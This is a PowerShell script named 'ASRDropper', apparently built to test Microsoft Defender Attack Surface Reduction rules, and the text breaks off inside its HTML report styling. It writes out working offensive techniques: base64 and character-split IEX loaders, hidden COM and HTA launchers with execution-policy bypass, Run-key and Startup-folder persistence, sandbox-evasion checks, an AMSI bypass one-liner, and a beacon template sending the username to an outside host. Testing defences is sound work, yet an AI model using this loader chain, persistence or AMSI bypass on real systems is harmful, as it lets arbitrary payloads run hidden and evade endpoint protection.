# ─────────────────────────────────────────────────────
#  Top‐level banner definition
# ─────────────────────────────────────────────────────
Clear-Host

$banner = @'
             .%*@-                           
            -@::@:                               
          .*%. =@.                               
          .@:  #*%@@@@@@%=..                     
          :@  .@+:...    ..:+%%@@@%+::....    .. 
         .%+ .+#..-*#%@@#+-::.....  ..-*#%@*.... 
         .=*#@@=...      ..:=+**%@%*+=-...%=.... 
               ...            ...   ..-=+##...   
                                                  
                -%%%%%%%%%%%%%%%%%%%%%%%%%%=.    
     *@%%%%%%%%%@+                     ..-%#.    
      -@+.      #+                  .-@@+.       
        :#@+:.  #+.             ..=@#:.       
           .=*@@%#*=.         ..+%-.        
               ....%=       ...%=.          
                  .%=        .:@.                
                 .@%. .%@@@@=. -@=               
             ..-@%..=@=.    ..=@#:.            
             .%%###%@. .....  *@####@:           
             .%*===+@@%#****#@@%====@:           
'@

# ─────────────────────────────────────────────────────
#  Menu function with boxed header
# ─────────────────────────────────────────────────────
function Show-Menu {
    Clear-Host

    # build a 60-char wide border
    $border = '*' * 60

    # top border
    Write-Host $border -ForegroundColor DarkCyan

    # the ASCII art
    Write-Host $banner

    # middle border
    Write-Host $border -ForegroundColor DarkCyan

    # title line (pad to box width minus 2 for the stars)
    $titleText   = 'ASRDROPPER'
    $versionText = 'v1.0 - Use with Caution'
    $contentWidth = $border.Length - 2

    $titleLine   = '*' + $titleText.PadLeft( ([math]::Floor(($contentWidth + $titleText.Length)/2)) ).PadRight($contentWidth) + '*'
    $versionLine = '*' + $versionText.PadLeft(([math]::Floor(($contentWidth + $versionText.Length)/2)) ).PadRight($contentWidth) + '*'

    Write-Host $titleLine   -ForegroundColor Yellow
    Write-Host $versionLine -ForegroundColor Yellow

    # bottom border
    Write-Host $border -ForegroundColor DarkCyan
    Write-Host

    # ── your existing menu below ──
    Write-Host "=== ASR Multi-Vector Dropper ===" -ForegroundColor Cyan
    Write-Host "Configure your test suite:"
    Write-Host "[1] Toggle: Execute Payloads ($Execute)"
    Write-Host "[2] Toggle: Generate HTML Report ($LogHtml)"
    Write-Host "[3] Toggle: Enable Persistence ($Persist)"
    Write-Host "[4] Toggle: Create .lnk Shortcut ($CreateShortcut)"
    Write-Host "[5] Toggle: Cleanup After Execution ($Cleanup)"
    Write-Host "[6] Toggle: Include Signature Strings ($Signatures)"
    Write-Host "[7] Toggle: Sandbox Evasion (sleep, env checks) ($Evasion)"
    Write-Host "[8] Select Stage-2 Payload Source"
    Write-Host "[9] Choose Process for HTA/COM Launch ($ExternalProcess)"
    Write-Host "[A] Configure ASR Rules Testing" -ForegroundColor Yellow
    Write-Host "[0] Run Dropper with Selected Options"
    Write-Host
    #Write-Host "Choose an option:" -NoNewline
}

# ─────────────────────────────────────────────────────
#  Global defaults
# ─────────────────────────────────────────────────────
$Execute         = $false
$LogHtml         = $true
$Persist         = $false
$CreateShortcut  = $false
$Cleanup         = $false
$Signatures      = $false
$Evasion         = $false
$ExternalProcess = "calc.exe"
$PayloadCode     = "Write-Output '[Stage 2] Payload Executed!'"
$TestASR         = $false
$SelectedASRRules= @()

# ─────────────────────────────────────────────────────
#  Kick it off
# ─────────────────────────────────────────────────────
Show-Menu

# Define ASR Rules with their IDs (GUIDs) and descriptions
$ASRRules = @(
    @{
        Name = "Block executable content from email client and webmail";
        Id = "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550";
        Description = "Blocks executable files launched from email or webmail clients";
        Category = "Mail";
        Standard = $false;
    },
    @{
        Name = "Block all Office applications from creating child processes";
        Id = "D4F940AB-401B-4EFC-AADC-AD5F3C50688A";
        Description = "Prevents Office apps from creating child processes, a common malware technique";
        Category = "Office";
        Standard = $false;
    },
    @{
        Name = "Block Office applications from creating executable content";
        Id = "3B576869-A4EC-4529-8536-B80A7769E899";
        Description = "Blocks Office apps from creating executable files, commonly used in macro attacks";
        Category = "Office";
        Standard = $false;
    },
    @{
        Name = "Block Office applications from injecting code into other processes";
        Id = "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84";
        Description = "Prevents Office apps from injecting code into other processes";
        Category = "Office";
        Standard = $false;
    },
    @{
        Name = "Block JavaScript or VBScript from launching downloaded executable content";
        Id = "D3E037E1-3EB8-44C8-A917-57927947596D";
        Description = "Prevents scripts from launching downloaded executable content";
        Category = "Scripts";
        Standard = $false;
    },
    @{
        Name = "Block execution of potentially obfuscated scripts";
        Id = "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC";
        Description = "Blocks scripts that appear to be obfuscated";
        Category = "Scripts";
        Standard = $false;
    },
    @{
        Name = "Block Win32 API calls from Office macros";
        Id = "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B";
        Description = "Blocks Office macros from making Win32 API calls";
        Category = "Office";
        Standard = $false;
    },
    @{
        Name = "Block executable files from running unless they meet prevalence, age, or trusted list criteria";
        Id = "01443614-CD74-433A-B99E-2ECDC07BFC25";
        Description = "Uses cloud protection to block suspicious executables";
        Category = "Executables";
        Standard = $false;
    },
    @{
        Name = "Block credential stealing from the Windows local security authority subsystem";
        Id = "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2";
        Description = "Blocks credential theft from LSASS";
        Category = "Credential Theft";
        Standard = $true;
    },
    @{
        Name = "Block process creations originating from PSExec and WMI commands";
        Id = "D1E49AAC-8F56-4280-B9BA-993A6D77406C";
        Description = "Blocks processes created by PSExec and WMI commands";
        Category = "Lateral Movement";
        Standard = $false;
    },
    @{
        Name = "Block untrusted and unsigned processes that run from USB";
        Id = "B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4";
        Description = "Blocks untrusted/unsigned USB executables";
        Category = "USB";
        Standard = $false;
    },
    @{
        Name = "Block Office communication applications from creating child processes";
        Id = "26190899-1602-49E8-8B27-EB1D0A1CE869";
        Description = "Blocks Office communication apps (Outlook, Teams) from creating child processes";
        Category = "Office";
        Standard = $false;
    },
    @{
        Name = "Block Adobe Reader from creating child processes";
        Id = "7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C";
        Description = "Blocks Adobe Reader from creating child processes";
        Category = "Adobe";
        Standard = $false;
    },
    @{
        Name = "Block persistence through WMI event subscription";
        Id = "E6DB77E5-3DF2-4CF1-B95A-636979351E5B";
        Description = "Prevents WMI persistence techniques";
        Category = "Persistence";
        Standard = $true;
    },
    @{
        Name = "Block abuse of exploited vulnerable signed drivers";
        Id = "56A863A9-875E-4185-98A7-B882C64B5CE5";
        Description = "Prevents abuse of vulnerable signed drivers";
        Category = "Drivers";
        Standard = $true;
    },
    @{
        Name = "Use advanced protection against ransomware";
        Id = "C1DB55AB-C21A-4637-BB3F-A12568109D35";
        Description = "Provides enhanced protection against ransomware attacks";
        Category = "Ransomware";
        Standard = $false;
    }
)

# Function to show ASR rules selection menu
function Show-ASRRulesMenu {
    Clear-Host
    Write-Host "=== ASR Rules Testing Configuration ===" -ForegroundColor Yellow
    Write-Host "Select which ASR rules to test:"
    
    # Create a new array with display indices
    $displayRules = @()
    
    # Add standard rules first
    $standardRules = $ASRRules | Where-Object { $_.Standard -eq $true }
    foreach ($rule in $standardRules) {
        $displayRules += $rule
    }
    
    # Add other rules
    $otherRules = $ASRRules | Where-Object { $_.Standard -eq $false }
    foreach ($rule in $otherRules) {
        $displayRules += $rule
    }
    
    # Display standard protection rules first
    Write-Host "Standard Protection Rules:" -ForegroundColor Green
    
    for ($i = 0; $i -lt $standardRules.Count; $i++) {
        $rule = $standardRules[$i]
        $index = $i + 1
        $selected = $SelectedASRRules -contains $rule.Id
        $indicator = if ($selected) { "[X]" } else { "[ ]" }
        Write-Host "[$index] $indicator $($rule.Name)"
        Write-Host "    GUID: $($rule.Id)" -ForegroundColor DarkGray
        Write-Host "    $($rule.Description)" -ForegroundColor DarkGray
    }
    
    Write-Host "`nOther Protection Rules:" -ForegroundColor Cyan
    
    # Display other rules
    for ($i = 0; $i -lt $otherRules.Count; $i++) {
        $rule = $otherRules[$i]
        $index = $i + $standardRules.Count + 1
        $selected = $SelectedASRRules -contains $rule.Id
        $indicator = if ($selected) { "[X]" } else { "[ ]" }
        Write-Host "[$index] $indicator $($rule.Name)"
        Write-Host "    GUID: $($rule.Id)" -ForegroundColor DarkGray
        Write-Host "    $($rule.Description)" -ForegroundColor DarkGray
    }
    
    Write-Host "`n[A] Select All Rules"
    Write-Host "[C] Clear All Selections"
    Write-Host "[S] Select Standard Protection Rules Only"
    Write-Host "[F] Filter by Category"
    Write-Host "[T] Toggle Test ASR Rules ($TestASR)"
    Write-Host "[B] Back to Main Menu"
    
    $choice = Read-Host "Enter your choice"
    if ($choice -eq "B") {
        # Simply return to main menu without clearing selections
        return
    }
    elseif ($choice -eq "A") {
        $script:SelectedASRRules = $ASRRules | ForEach-Object { $_.Id }
    }
    elseif ($choice -eq "C") {
        $script:SelectedASRRules = @()
    }
    elseif ($choice -eq "S") {
        $script:SelectedASRRules = $ASRRules | Where-Object { $_.Standard -eq $true } | ForEach-Object { $_.Id }
    }
    elseif ($choice -eq "T") {
        $script:TestASR = -not $TestASR
    }
    elseif ($choice -eq "F") {
        Filter-ASRRulesByCategory
    }
    elseif ([int]::TryParse($choice, [ref]$null)) {
        $choiceNum = [int]$choice
        if ($choiceNum -ge 1 -and $choiceNum -le $displayRules.Count) {
            $selectedRule = $displayRules[$choiceNum - 1]
            $ruleId = $selectedRule.Id
            
            if ($script:SelectedASRRules -contains $ruleId) {
                $script:SelectedASRRules = $script:SelectedASRRules | Where-Object { $_ -ne $ruleId }
            }
            else {
                $script:SelectedASRRules += $ruleId
            }
        }
        else {
            Write-Host "Invalid selection. Please enter a number between 1 and $($displayRules.Count)." -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
    
    Show-ASRRulesMenu
}

# Function to filter ASR rules by category
function Filter-ASRRulesByCategory {
    $categories = $ASRRules | ForEach-Object { $_.Category } | Sort-Object -Unique
    
    Clear-Host
    Write-Host "=== Filter ASR Rules by Category ===" -ForegroundColor Yellow
    Write-Host "Select a category to view/select rules:"
    
    $idx = 1
    foreach ($category in $categories) {
        Write-Host "[$idx] $category"
        $idx++
    }
    
    Write-Host "[B] Back to ASR Rules Menu"
    
    $choice = Read-Host "Enter your choice"
    if ($choice -eq "B") {
        Show-ASRRulesMenu
        return
    }
    elseif ([int]::TryParse($choice, [ref]$null)) {
        $choiceNum = [int]$choice
        if ($choiceNum -ge 1 -and $choiceNum -le $categories.Count) {
            $selectedCategory = $categories[$choiceNum - 1]
            Show-CategoryRules $selectedCategory
        }
        else {
            Write-Host "Invalid selection. Please enter a number between 1 and $($categories.Count)." -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
    
    Filter-ASRRulesByCategory
}

# Function to show and select rules in a specific category
function Show-CategoryRules {
    param($Category)
    
    Clear-Host
    Write-Host "=== ASR Rules in Category: $Category ===" -ForegroundColor Yellow
    
    $categoryRules = $ASRRules | Where-Object { $_.Category -eq $Category }
    
    # Display category rules with proper indexing
    for ($i = 0; $i -lt $categoryRules.Count; $i++) {
        $rule = $categoryRules[$i]
        $index = $i + 1
        $selected = $script:SelectedASRRules -contains $rule.Id
        $indicator = if ($selected) { "[X]" } else { "[ ]" }
        Write-Host "[$index] $indicator $($rule.Name)"
        Write-Host "    GUID: $($rule.Id)" -ForegroundColor DarkGray
        Write-Host "    $($rule.Description)" -ForegroundColor DarkGray
    }
    
    Write-Host "`n[A] Select All in This Category"
    Write-Host "[C] Clear All in This Category"
    Write-Host "[B] Back to Category Filter"
    
    $choice = Read-Host "Enter your choice"
    if ($choice -eq "B") {
        Filter-ASRRulesByCategory
        return
    }
    elseif ($choice -eq "A") {
        foreach ($rule in $categoryRules) {
            if ($script:SelectedASRRules -notcontains $rule.Id) {
                $script:SelectedASRRules += $rule.Id
            }
        }
    }
    elseif ($choice -eq "C") {
        foreach ($rule in $categoryRules) {
            $script:SelectedASRRules = $script:SelectedASRRules | Where-Object { $_ -ne $rule.Id }
        }
    }
    elseif ([int]::TryParse($choice, [ref]$null)) {
        $choiceNum = [int]$choice
        if ($choiceNum -ge 1 -and $choiceNum -le $categoryRules.Count) {
            $selectedRule = $categoryRules[$choiceNum - 1]
            $ruleId = $selectedRule.Id
            
            if ($script:SelectedASRRules -contains $ruleId) {
                $script:SelectedASRRules = $script:SelectedASRRules | Where-Object { $_ -ne $ruleId }
            }
            else {
                $script:SelectedASRRules += $ruleId
            }
        }
        else {
            Write-Host "Invalid selection. Please enter a number between 1 and $($categoryRules.Count)." -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
    
    Show-CategoryRules $Category
}

function Select-Payload {
    Write-Host "`n=== Payload Source Selection ===" -ForegroundColor Cyan
    Write-Host "[1] Use default payload"
    Write-Host "[2] Paste inline payload"
    Write-Host "[3] Load from .ps1 file"
    Write-Host "[4] Use template"
    $choice = Read-Host "Choose option"

    switch ($choice) {
        '1' { return 'Write-Output "[Stage 2] Payload Executed!"' }
        '2' {
            Write-Host "Paste your payload code (end with a blank line):"
            $lines = @()
            while ($true) {
                $line = Read-Host ">>"
                if ($line -eq '') { break }
                $lines += $line
            }
            return $lines -join "`n"
        }
        '3' {
            $file = Read-Host "Enter full path to .ps1 file"
            if (Test-Path $file) {
                return Get-Content -Raw -Path $file
            } else {
                Write-Host "File not found." -ForegroundColor Red
                return Select-Payload
            }
        }
        '4' {
            Write-Host "[a] AMSI Bypass"
            Write-Host "[b] Simulated LSASS Access"
            Write-Host "[c] Web Callback Beacon"
            $tpl = Read-Host "Choose template"
            switch ($tpl) {
                'a' { return '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)' }
                'b' { return 'Get-Process -Name lsass | ForEach-Object { Write-Output "Accessing PID $($_.Id)" }' }
                'c' { return 'Invoke-WebRequest -Uri http://example.com/beacon?id=$env:USERNAME' }
                default {
                    Write-Host "Invalid template." -ForegroundColor Red
                    return Select-Payload
                }
            }
        }
        default {
            Write-Host "Invalid option. Try again." -ForegroundColor Red
            return Select-Payload
        }
    }
}

# Function to test ASR Rules
function Test-ASRRules {
    $results = @()
    
    # Check if any ASR rules are selected
    if ($SelectedASRRules.Count -eq 0) {
        Write-Host "No ASR rules selected for testing." -ForegroundColor Yellow
        return $results
    }
    
    Write-Host "`n=== Testing ASR Rules ===" -ForegroundColor Cyan
    Write-Host "Rules to test: $($SelectedASRRules.Count)" -ForegroundColor Yellow
    
    # Create a temporary directory for ASR testing
    $tempDir = Join-Path $env:TEMP "ASRTesting"
    if (-not (Test-Path $tempDir)) {
        New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
    }
    
    foreach ($ruleId in $SelectedASRRules) {
        $rule = $ASRRules | Where-Object { $_.Id -eq $ruleId }
        
        Write-Host "`n[TEST] Rule: $($rule.Name)" -ForegroundColor Yellow
        Write-Host "  ID: $($rule.Id)" -ForegroundColor DarkGray
        Write-Host "  Category: $($rule.Category)" -ForegroundColor DarkGray
        
        # Get current rule state
        $currentState = $null
        try {
            $preference = Get-MpPreference
            if ($preference.AttackSurfaceReductionRules_Ids -contains $ruleId) {
                $index = [array]::IndexOf($preference.AttackSurfaceReductionRules_Ids, $ruleId)
                $currentState = $preference.AttackSurfaceReductionRules_Actions[$index]
            }
            else {
                $currentState = "Not Configured"
            }
        }
        catch {
            $currentState = "Error checking state"
        }
        
        # Create test files based on rule category
        $testFiles = @()
        $testState = "Tested"
        $testDetails = "Rule tested successfully"
        
        try {
            switch ($rule.Category) {
                "Office" {
                    # Simulate Office behavior
                    $testFilePath = Join-Path $tempDir "office_test.ps1"
                    Set-Content -Path $testFilePath -Value "Start-Process calc.exe" -Force
                    $testFiles += $testFilePath
                }
                "Scripts" {
                    # Create test obfuscated script
                    $testFilePath = Join-Path $tempDir "obfuscated_script.ps1"
                    $obfuscatedContent = "`$x='c'+'a'+'l'+'c';Start-Process `$x"
                    Set-Content -Path $testFilePath -Value $obfuscatedContent -Force
                    $testFiles += $testFilePath
                }
                "Credential Theft" {
                    # Simulate LSASS access
                    $testFilePath = Join-Path $tempDir "lsass_access.ps1"
                    Set-Content -Path $testFilePath -Value "Get-Process lsass" -Force
                    $testFiles += $testFilePath
                }
                "Executables" {
                    # Create test executable content
                    $testFilePath = Join-Path $tempDir "test_exec.ps1"
                    Set-Content -Path $testFilePath -Value "New-Item -ItemType File -Path '$tempDir\test.exe' -Force" -Force
                    $testFiles += $testFilePath
                }
                "Persistence" {
                    # Simulate WMI persistence with timeout protection
                    $testFilePath = Join-Path $tempDir "wmi_persist.ps1"
                    $safeWmiScript = @'
# Add timeout protection for WMI queries
$timeoutScript = {
    try {
        # Safer WMI query that's less likely to hang
        $result = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction Stop
        Write-Output "WMI query executed (simulating persistence check)"
    }
    catch {
        Write-Output "WMI query failed: $($_.Exception.Message)"
    }
}

# Create a job with a timeout
$job = Start-Job -ScriptBlock $timeoutScript
$completed = Wait-Job $job -Timeout 5
if ($completed -eq $null) {
    Write-Output "WMI query timed out after 5 seconds"
    Stop-Job $job
}
else {
    Receive-Job $job
}
Remove-Job $job -Force
'@
                    Set-Content -Path $testFilePath -Value $safeWmiScript -Force
                    $testFiles += $testFilePath
                }
                "Drivers" {
                    # Simulate driver operations
                    $testFilePath = Join-Path $tempDir "driver_test.ps1"
                    Set-Content -Path $testFilePath -Value "Get-WindowsDriver -Online -All | Select-Object -First 1" -Force
                    $testFiles += $testFilePath
                }
                default {
                    # Generic test for other categories
                    $testFilePath = Join-Path $tempDir "generic_test.ps1"
                    Set-Content -Path $testFilePath -Value "Write-Output 'Testing $($rule.Name)'" -Force
                    $testFiles += $testFilePath
                }
            }
            
            # Try to temporarily enable the rule in Audit mode for testing
            $originalRuleState = $currentState
            
            if ($Execute) {
                try {
                    # Enable rule in audit mode
                    Add-MpPreference -AttackSurfaceReductionRules_Ids $ruleId -AttackSurfaceReductionRules_Actions AuditMode -ErrorAction SilentlyContinue
                    
                    # Execute test files
                    foreach ($testFile in $testFiles) {
                        if (Test-Path $testFile) {
                            Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$testFile`"" -Wait -WindowStyle Hidden
                        }
                    }
                    
                    # Check Event Viewer for ASR events
                    $events = Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -ErrorAction SilentlyContinue | 
                              Where-Object { $_.Id -eq 1121 -and $_.Message -like "*$ruleId*" } | 
                              Select-Object -First 5
                    
                    if ($events -and $events.Count -gt 0) {
                        $testState = "Triggered"
                        $testDetails = "Rule triggered $($events.Count) audit events"
                        Write-Host "  Result: TRIGGERED ($($events.Count) events)" -ForegroundColor Green
                    }
                    else {
                        $testState = "Not Triggered"
                        $testDetails = "No audit events detected for this rule"
                        Write-Host "  Result: NOT TRIGGERED (no events)" -ForegroundColor Red
                    }
                }
                catch {
                    $testState = "Error"
                    $testDetails = "Error testing rule: $($_.Exception.Message)"
                }
                finally {
                    # Restore original rule state if it was changed
                    if ($originalRuleState -ne "Not Configured") {
                        try {
                            Add-MpPreference -AttackSurfaceReductionRules_Ids $ruleId -AttackSurfaceReductionRules_Actions $originalRuleState -ErrorAction SilentlyContinue
                        }
                        catch {
                            Write-Host "Error restoring original rule state: $($_.Exception.Message)" -ForegroundColor Red
                        }
                    }
                    else {
                        try {
                            Remove-MpPreference -AttackSurfaceReductionRules_Ids $ruleId -ErrorAction SilentlyContinue
                        }
                        catch {
                            # Ignore errors when removing if it wasn't configured originally
                        }
                    }
                }
            }
            else {
                $testState = "Skipped"
                $testDetails = "Execution not enabled"
                Write-Host "  Result: SKIPPED (execution disabled)" -ForegroundColor Gray
            }
        }
        catch {
            $testState = "Error"
            $testDetails = "Error during rule testing: $($_.Exception.Message)"
            Write-Host "  Result: ERROR ($($_.Exception.Message))" -ForegroundColor Red
        }
        
        # Add result
        $results += [PSCustomObject]@{
            RuleName = $rule.Name
            RuleId = $rule.Id
            Category = $rule.Category
            CurrentState = $currentState
            TestState = $testState
            TestDetails = $testDetails
            Standard = $rule.Standard
        }
        
        # Clean up test files
        foreach ($testFile in $testFiles) {
            if (Test-Path $testFile) {
                Remove-Item -Path $testFile -Force -ErrorAction SilentlyContinue
            }
        }
    }
    
    # Clean up temp directory if empty
    if ((Get-ChildItem -Path $tempDir -ErrorAction SilentlyContinue).Count -eq 0) {
        Remove-Item -Path $tempDir -Force -ErrorAction SilentlyContinue
    }
    
    Write-Host "`n[COMPLETE] ASR Rules testing complete. Tested $($results.Count) rules." -ForegroundColor Green
    Write-Host "    Triggered: $(($results | Where-Object { $_.TestState -eq "Triggered" }).Count)" -ForegroundColor Yellow
    Write-Host "    Not Triggered: $(($results | Where-Object { $_.TestState -eq "Not Triggered" }).Count)" -ForegroundColor Cyan
    Write-Host "    Skipped: $(($results | Where-Object { $_.TestState -eq "Skipped" }).Count)" -ForegroundColor Gray
    Write-Host "    Errors: $(($results | Where-Object { $_.TestState -eq "Error" }).Count)" -ForegroundColor Red

    # Add summary table with IDs
    Write-Host "`n=== ASR Rules Testing ===" -ForegroundColor Cyan
    Write-Host "Test ASR Rules: " -NoNewline
    Write-Host "Enabled" -ForegroundColor Green

    # Display selected rules count with an ID list
    Write-Host "Selected Rules: $($SelectedASRRules.Count)"

    # Add this new section to show a list of selected rules with IDs
    if ($SelectedASRRules.Count -gt 0) {
        Write-Host "`nSelected Rule IDs:" -ForegroundColor Yellow
        foreach ($ruleId in $SelectedASRRules) {
            $rule = $ASRRules | Where-Object { $_.Id -eq $ruleId }
            if ($rule) {
                Write-Host "  $($rule.Name): $($rule.Id)" -ForegroundColor Cyan
            }
        }
        Write-Host ""  # Add a blank line for spacing
    }
    
    # Display selected rules with IDs in a table format
    if ($SelectedASRRules.Count -gt 0) {
        $ruleSummary = @()
        foreach ($ruleId in $SelectedASRRules) {
            $rule = $ASRRules | Where-Object { $_.Id -eq $ruleId }
            $result = $results | Where-Object { $_.RuleId -eq $ruleId }
            
            $resultState = if ($result) { 
                switch ($result.TestState) {
                    "Triggered" { "* Triggered" }
                    "Not Triggered" { "x Not Triggered" }
                    "Skipped" { "- Skipped" }
                    "Error" { "! Error" }
                    default { "? Unknown" }
                }
            } else { "? Unknown" }
            
            $ruleSummary += [PSCustomObject]@{
                Name = $rule.Name
                ID = $rule.Id
                Status = $resultState
            }
        }
        
        # Display the table
        $ruleSummary | Format-Table -Property Name, ID, Status -AutoSize
    }
    
    return $results
}

# === Menu Loop ===
do {
    Show-Menu
    $choice = Read-Host "Choose an option"
    switch ($choice) {
        '1' { $Execute = -not $Execute }
        '2' { $LogHtml = -not $LogHtml }
        '3' { $Persist = -not $Persist }
        '4' { $CreateShortcut = -not $CreateShortcut }
        '5' { $Cleanup = -not $Cleanup }
        '6' { $Signatures = -not $Signatures }
        '7' { $Evasion = -not $Evasion }
        '8' { $PayloadCode = Select-Payload }
        '9' { $ExternalProcess = Read-Host "Enter process to launch (e.g., calc.exe or notepad.exe)" }
        'A' { Show-ASRRulesMenu }
        'a' { Show-ASRRulesMenu }
    }
} while ($choice -ne '0')

# === Setup
# Set path to C:\Users\Public
$DropPath = "C:\Users\Public"
Write-Host "Using output directory: $DropPath" -ForegroundColor Yellow

$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$results = @()
function New-RandomName { ( -join ((48..57)+(97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_}) ) }

function Encode($s) { [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s)) }

# === File Names
$fn_test = (New-RandomName) + ".ps1"
$fn_ps   = (New-RandomName) + ".ps1"
$fn_com  = (New-RandomName) + ".ps1"
$fn_multi = (New-RandomName) + ".ps1"
$fn_hta  = (New-RandomName) + ".hta"
$fn_sig  = (New-RandomName) + ".ps1"
$testScript = Join-Path $DropPath $fn_test

# === Stage 2 Payload
if ($Evasion) {
    $PayloadCode = "Start-Sleep -Seconds 5`nif (([Environment]::UserName -eq 'WDAGUtilityAccount') -or ($env:COMPUTERNAME -like '*SANDBOX*')) { exit }`n$PayloadCode"
}
Set-Content $testScript $PayloadCode -Force

# === Payload 1: Encoded
$encoded1 = Encode "IEX `"$testScript`""
$p1 = Join-Path $DropPath $fn_ps
Set-Content $p1 "`$b='$encoded1';iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$b)))" -Force

# === Payload 2: COM (external process)
$p2 = Join-Path $DropPath $fn_com
Set-Content $p2 "(New-Object -ComObject WScript.Shell).Run('powershell -ep bypass -w hidden -Command `"Start-Process $ExternalProcess`"')" -Force

# === Payload 3: Multi
$chunks = ($encoded1.ToCharArray() | ForEach-Object { "'$_'" }) -join ","
$p3 = Join-Path $DropPath $fn_multi
Set-Content $p3 "`$s = [string]::Join('', @($chunks));iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$s)))" -Force

# === Payload 4: HTA
$p4 = Join-Path $DropPath $fn_hta
$html = "<html><head><script>new ActiveXObject('WScript.Shell').Run('powershell -ep bypass -w hidden -Command `"Start-Process $ExternalProcess`"');window.close();</script></head><body></body></html>"
Set-Content $p4 $html

# === Payload 5: Signatures
$p5 = Join-Path $DropPath $fn_sig
if ($Signatures) {
    # Set URL for Invoke-Mimikatz
    $mimikatzUrl = "https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1"
    Set-Content $p5 '$x="Invoke-Mimikatz from '$mimikatzUrl' sekurlsa::logonpasswords SharpHound CobaltStrike";Write-Host "[YARA bait triggered]"'
}

# === Shortcut
if ($CreateShortcut) {
    $sc = "$DropPath\loader.lnk"
    $ws = New-Object -ComObject WScript.Shell
    $lnk = $ws.CreateShortcut($sc)
    $lnk.TargetPath = "powershell.exe"
    $lnk.Arguments = "-ep bypass -w hidden -File `"$p1`""
    $lnk.Save()
}

# === Persistence
if ($Persist) {
    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$fn_ps"
    Copy-Item $p1 $startup -Force
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ASRDropper" `
        -Value "powershell -ep bypass -w hidden -File `"$startup`"" -Force
}

# === Execution + Logging
$payloads = @(
    @{ Name = "Encoded PS"; Path = $p1 },
    @{ Name = "COM Shell"; Path = $p2 },
    @{ Name = "Multi-stage"; Path = $p3 },
    @{ Name = "HTA"; Path = $p4; IsHTA = $true }
)
if ($Signatures) {
    $payloads += @{ Name = "Signature Bait"; Path = $p5 }
}

foreach ($p in $payloads) {
    $cmd = if ($p.IsHTA) { "mshta `"$($p.Path)`"" } else { "powershell -ep bypass -w hidden -File `"$($p.Path)`"" }
    $out = ''
    if ($Execute) {
        try { $out = & powershell -Command $cmd *>&1 }
        catch { $out = $_.Exception.Message }
    }
    $results += [pscustomobject]@{
        Name = $p.Name; Path = $p.Path
        Output = $out -join "`n"; Success = $out -match "Executed|YARA|Accessing PID"
    }
}

# === Test ASR Rules
$asrResults = @()
if ($TestASR) {
    $asrResults = Test-ASRRules
}

# === HTML Log
if ($LogHtml) {
    # Ask for custom HTML report filename
    $customReportName = Read-Host "Enter custom HTML report filename (default: ASR-Report.html)"
    
    if ([string]::IsNullOrWhiteSpace($customReportName)) {
        $reportFilename = "ASR-Report.html"
    } else {
        # Ensure filename has .html extension
        if (-not $customReportName.EndsWith(".html", [StringComparison]::OrdinalIgnoreCase)) {
            $reportFilename = "$customReportName.html"
        } else {
            $reportFilename = $customReportName
        }
    }
    
    $logPath = Join-Path $DropPath $reportFilename
    Write-Host "HTML report will be saved to: $logPath" -ForegroundColor Cyan
    
    # Create HTML report
    # PS 5.1 compatible HTML without Unicode characters
    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASR Dropper and Rules Testing Report</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f8f9fa;
        }
        h1, h2, h3 {
            color: #2c3e50;
        }
        h1 {
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
            margin-bottom: 30px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header-right {
            text-align: right;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 20px;
            margin: 20px 0;
        }
        .summary {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .summary-box {
            background: #f5f5f5;
            border-radius: 5px;
            padding: 15px;
            width: 30%;
            box-shadow: 0 1px 5px rgba(0,0,0,0.05);
        }
        .success {
            color: #27ae60;
            font-weight: bold;
        }
        .warning {
            color: #f39c12;
            font-weight: bold;
        }
        .danger {
            color: #e74c3c;
            font-weight: bold;
        }
        .info {
            color: #3498db;
            font-weight: bold;
        }
        .passive {
            color: #95a5a6;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #f2f2f2;
            font-weight: bold;
        }
        tr:hover {
            background-color: #f5f5f5;
        }
        .result-cell {
            font-weight: bold;
        }
        .terminal {
            background: #2c3e50;
            color: #ecf0f1;
            font-family: 'Consolas', 'Courier New', monospace;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 10px 0;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
        }
        .badge-standard {
            background-color: #3498db;
            color: white;
        }
        .badge-triggered {
            background-color: #2ecc71;
            color: white;
        }
